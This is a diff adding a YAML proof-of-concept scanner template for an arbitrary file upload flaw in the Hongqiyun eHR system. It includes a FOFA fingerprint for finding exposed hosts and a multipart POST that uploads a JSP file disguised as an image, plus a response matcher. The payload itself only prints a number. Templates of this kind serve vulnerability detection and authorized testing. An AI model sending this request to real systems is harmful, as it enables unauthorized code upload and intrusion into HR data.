@@ -1,0 +1,25 @@
+id: poc-yaml-hr-soft-ehr-kqfile-upload
+info:
+  name: 红海云eHR系统kgFile.mob存在任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 红海云eHR
+  fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+requests:
+- method: POST
+  path: /RedseaPlatform/kqFile.mob?method=uploadFile&fileName=fbjgrohu.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeaaGwoqCxccjHcca
+  data: '------WebKitFormBoundaryeaaGwoqCxccjHcca
+
+    Content-Disposition: form-data; name="fj_file"; filename="fbjgrohu.jpg"
+
+
+    <% out.println(111*111); %>
+
+    ------WebKitFormBoundaryeaaGwoqCxccjHcca--'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"meg\\\" : \\\"处理成功\\\"\"\
+    ) &&\ncontains(body,\"\\\"state\\\" : \\\"1\\\"\") &&\ncontains(body,\"jsp\")\n"
+variables: {}
+transport: http
